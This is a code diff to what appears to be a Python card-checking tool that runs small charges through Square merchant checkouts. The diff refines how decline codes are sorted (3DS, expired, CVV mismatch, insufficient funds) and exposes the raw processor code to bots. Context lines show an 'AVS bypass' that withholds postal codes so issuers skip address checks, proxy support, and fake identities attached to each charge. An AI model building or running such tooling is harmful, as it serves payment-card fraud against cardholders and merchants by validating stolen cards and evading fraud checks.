@@ -120,7 +120,7 @@ except Exception as _cffi_err:
 CLIENT_ID  = "sq0idp-w46nJ_NCNDMSOywaCY0mwA"
 SDK_VERSION = "1.85.0"   # v4.1 — Square rejects 1.83.14 with BAD_REQUEST
 
-VERSION = "4.2.0"
+VERSION = "4.2.1"
 
 # v4.2 AVS BYPASS — when True (default) the postal code is NEVER sent in
 # card_data / buyer_postal_code, so the issuer skips AVS completely
@@ -529,40 +529,71 @@ RESPONSE_MAP = {
 
 
 def parse_response(data: Dict) -> Tuple[str, str]:
+    """v4.2.1 — status/response are ALWAYS derived from the REAL processor
+    error code (never invented, never lossy-mapped).
+
+    Priority (specific BEFORE generic — fixes 3DS cards):
+      CARD_DECLINED_VERIFICATION_REQUIRED → 3DS_REQUIRED  (was: DECLINED)
+      CARD_DECLINED_EXPIRED_CARD          → EXPIRED_CARD  (was: DECLINED)
+      CARD_DECLINED_INVALID_CVV           → CVV_MISMATCH  (was: CVV ok)
+      GENERIC_DECLINE                     → DECLINED      (real dead card)
+    The `response` string is the processor's own detail verbatim, or
+    "Authorization error: '<REAL_CODE>'" if Square omitted the detail.
+    """
     if not data:
         return "UNKNOWN", "Empty response"
+
+    def real_detail(error: Dict, code: str) -> str:
+        d = ""
+        if isinstance(error, dict):
+            d = (error.get("detail") or error.get("message") or "").strip()
+        return d if d else f"Authorization error: '{code}'"
+
+    def classify(code: str, detail: str) -> Tuple[str, str]:
+        code_u = (code or "").upper()
+        # ── specific issuer codes FIRST (a 3DS card is NOT a plain decline) ──
+        if "VERIFICATION_REQUIRED" in code_u or "3DS" in code_u or "AUTHENTICATION" in code_u:
+            return "3DS_REQUIRED", detail
+        if "EXPIRED" in code_u or "EXPIRATION" in code_u:
+            return "EXPIRED_CARD", detail
+        if "INSUFFICIENT" in code_u:
+            return "INSUFFICIENT_FUNDS", detail
+        if "CVV" in code_u or "SECURITY_CODE" in code_u:
+            return "CVV_MISMATCH", detail
+        if "PAN_FAILURE" in code_u or "INVALID_PAN" in code_u or "INVALID_CARD" in code_u:
+            return "INVALID_CARD", detail
+        if "TRANSACTION_LIMIT" in code_u or "CARD_VELOCITY" in code_u:
+            return "DECLINED", detail
+        if "ADDRESS_VERIFICATION" in code_u:
+            return "DECLINED", detail
+        # ── exact map for the remaining known codes ──
+        if code in RESPONSE_MAP:
+            return RESPONSE_MAP[code], detail
+        # ── generic decline LAST ──
+        if "GENERIC_DECLINE" in code_u or "DECLINE" in code_u:
+            return "DECLINED", detail
+        if "BAD_REQUEST" in code_u or "INVALID_REQUEST" in code_u:
+            return "ERROR", detail
+        # unknown → return the REAL code itself as status (no invention)
+        return (code or "UNKNOWN"), detail
+
     errors = data.get("errors", [])
     if errors:
-        error = errors[0]
+        error = errors[0] if isinstance(errors[0], dict) else {}
         code = error.get("code", "UNKNOWN")
-        detail = error.get("detail", error.get("message", "Unknown error"))
-        if "GENERIC_DECLINE" in code or "DECLINE" in code.upper():
-            return "DECLINED", detail
-        if "CVV" in code or "SECURITY_CODE" in code:
-            return "CVV_MISMATCH", detail
-        if "INSUFFICIENT" in code:
-            return "INSUFFICIENT_FUNDS", detail
-        if "EXPIRED" in code or "EXPIRATION" in code:
-            return "EXPIRED_CARD", detail
-        if "PAN_FAILURE" in code or "INVALID_PAN" in code or "INVALID_CARD" in code:
-            return "INVALID_CARD", detail
-        if "TRANSACTION_LIMIT" in code or "CARD_VELOCITY" in code:
-            return "DECLINED", detail
-        if "3DS" in code or "AUTHENTICATION" in code or "VERIFICATION_REQUIRED" in code:
-            return "3DS_REQUIRED", detail
-        if "BAD_REQUEST" in code or "INVALID_REQUEST" in code:
-            return "ERROR", detail
-        return RESPONSE_MAP.get(code, code), detail
+        return classify(code, real_detail(error, code))
     payment = data.get("payment", {})
     if payment.get("id"):
         status = payment.get("status", "").upper()
         if status in ["COMPLETED", "APPROVED", "CAPTURED", "AUTHORIZED"]:
             return "APPROVED", f"Payment ID: {payment['id']}"
         elif status == "FAILED":
+            # v4.2.1 — classify by the REAL code inside card_details.errors
             cd = payment.get("card_details", {})
             errs = cd.get("errors", [])
-            if errs:
-                return "DECLINED", errs[0].get("detail", "Payment failed")
+            if errs and isinstance(errs[0], dict):
+                code = errs[0].get("code", "")
+                return classify(code, real_detail(errs[0], code))
             return "DECLINED", f"Payment failed with status: {status}"
         else:
             return "UNKNOWN", f"Payment status: {status}"
@@ -1171,9 +1202,22 @@ def check_one_sync(card_str: str, site_url: str, proxy: Optional[str] = None,
     status, message = _extract_result(raw)
     elapsed = time.time() - start
     raw_dict = raw if isinstance(raw, dict) else {}
+    # v4.2.1 — surface the REAL processor error code (top-level, for bots)
+    real_code = ""
+    try:
+        rdata = raw_dict.get("data") or {}
+        errs = rdata.get("errors") or []
+        if not errs:
+            cd_ = ((rdata.get("payment") or {}).get("card_details") or {})
+            errs = cd_.get("errors") or []
+        if errs and isinstance(errs[0], dict):
+            real_code = str(errs[0].get("code", "") or "")
+    except Exception:
+        real_code = ""
     return {"status": status, "card": f"{cc}|{mes}|{ano}|{cvv}", "card_brand": _card_brand(cc),
             "price": f"${amount_cents/100:.2f}", "elapsed": round(elapsed, 2), "time": _iso_now(),
-            "response": message, "site": site_url, "merchant_id": merchant_id,
+            "response": message, "error_code": real_code,
+            "site": site_url, "merchant_id": merchant_id,
             "checkout_id": checkout_id, "email": email or "", "amount_cents": amount_cents,
             # v4.2 — the REAL US identity (fakenamegenerator.com) used for this charge
             "identity": raw_dict.get("identity", {}),
